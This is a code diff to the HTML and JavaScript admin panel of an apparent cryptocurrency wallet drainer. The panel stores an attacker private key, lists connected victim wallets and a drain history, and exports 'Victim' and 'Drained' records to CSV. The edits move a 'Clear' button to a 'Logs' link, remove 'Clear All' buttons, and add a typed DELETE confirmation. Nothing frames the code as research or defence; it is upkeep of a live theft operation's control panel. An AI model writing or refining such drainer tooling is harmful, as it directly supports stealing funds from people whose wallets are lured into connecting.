@@ -437,7 +437,7 @@
               <div class="qa-item" onclick="showPage('gas',document.querySelectorAll('.sb-item')[4])"><div class="qa-icon">&#9981;</div><div class="qa-label">Gas</div></div>
               <div class="qa-item" onclick="exportWallets()"><div class="qa-icon">&#8615;</div><div class="qa-label">Export</div></div>
               <div class="qa-item" onclick="showPage('config',document.querySelectorAll('.sb-item')[5])"><div class="qa-icon">&#9881;</div><div class="qa-label">Config</div></div>
-              <div class="qa-item" onclick="clearWallets()"><div class="qa-icon" style="color:var(--red)">&#128465;</div><div class="qa-label">Clear</div></div>
+              <div class="qa-item" onclick="showPage('logs',document.querySelectorAll('.sb-item')[6])"><div class="qa-icon">&#9638;</div><div class="qa-label">Logs</div></div>
             </div>
           </div>
         </div>
@@ -473,7 +473,6 @@
         <div><h1>Connected Wallets</h1><p id="wallets-subtitle">All wallets</p></div>
         <div style="display:flex;gap:8px">
           <button class="btn ghost sm" onclick="exportWallets()">Export CSV</button>
-          <button class="btn red sm" onclick="clearWallets()">Clear All</button>
         </div>
       </div>
       <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap">
@@ -566,7 +565,7 @@
         <div id="test-result" style="margin-top:16px;display:none;background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:18px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:2.2"></div>
       </div></div>
       <div class="card"><div class="card-head"><span class="card-title">Data</span></div><div class="card-body">
-        <div style="display:flex;gap:10px"><button class="btn red sm" onclick="clearWallets()">Clear Wallets</button><button class="btn ghost sm" onclick="clearLogs()">Clear Logs</button></div>
+        <div style="display:flex;gap:10px"><button class="btn ghost sm" onclick="clearLogs()">Clear Logs</button></div>
         <p style="font-size:11px;color:var(--muted);margin-top:12px">In-memory storage. Export before clearing.</p>
       </div></div>
     </div>
@@ -857,7 +856,7 @@ function previewWallet(){const pk=document.getElementById('cfg-pk').value.trim()
 async function saveConfig(){const pk=document.getElementById('cfg-pk').value.trim();if(!pk)return;const r=await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({attackerPrivateKey:pk})});const m=document.getElementById('cfg-msg');m.style.display='block';if(r.ok){m.style.color='var(--green)';m.textContent='Saved';document.getElementById('cfg-pk').value='';refresh()}else{m.style.color='var(--red)';m.textContent=r.error}}
 async function savePassword(){const pw=document.getElementById('cfg-pw-new').value;if(!pw)return;const r=await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({adminPassword:pw})});const m=document.getElementById('pw-msg');m.style.display='block';if(r.ok){adminPw=pw;m.style.color='var(--green)';m.textContent='Updated';document.getElementById('cfg-pw-new').value=''}else{m.style.color='var(--red)';m.textContent='Failed'}}
 async function testConnection(){const el=document.getElementById('test-result');el.style.display='block';el.innerHTML='<span style="color:var(--muted)">Running...</span>';const d=await apiFetch('/admin/dashboard');el.innerHTML=`<div style="color:var(--green)">Backend online</div><div style="${d.attackerAddress?'color:var(--green)':'color:var(--red)'}">${d.attackerAddress?'Wallet: '+d.attackerAddress:'No wallet configured'}</div><div style="color:var(--cyan)">Wallets: ${(d.connectedWallets||[]).length}</div><div style="color:var(--cyan)">Drains: ${(d.drainHistory||[]).length}</div>`}
-async function clearWallets(){if(!confirm('Clear all data?'))return;await apiFetch('/admin/wallets',{method:'DELETE'});await refresh();toast('Cleared')}
+async function clearWallets(){const c=window.prompt('Type DELETE to clear all wallet and drain history:');if(c!=='DELETE')return;await apiFetch('/admin/wallets',{method:'DELETE'});await refresh();toast('Cleared')}
 async function clearLogs(){await apiFetch('/admin/logs',{method:'DELETE'});await refresh();toast('Logs cleared')}
 function exportWallets(){const rows=[['Address','Chain','Tokens','Value','Connected','Status']];allWallets.forEach(w=>{let v=0;const t=(w.tokens||[]).map(t=>{v+=(UP[t.symbol]||1)*parseFloat(t.balance||0);return t.symbol+':'+t.balance}).join(';');rows.push([w.address,CN[w.chainId]||w.chainId,t,'$'+v.toFixed(2),w.connectedAt,w.drained?'Drained':'Active'])});downloadCSV(rows,'wallets.csv')}
 function exportDrains(){const rows=[['Victim','Token','Amount','Chain','Status','Tx','Time']];(dashData.drainHistory||[]).forEach(x=>{rows.push([x.owner,x.symbol||'',x.amount||'',CN[x.chainId]||x.chainId,x.success?'Success':'Failed',x.txHash||'',x.startedAt])});downloadCSV(rows,'drains.csv')}
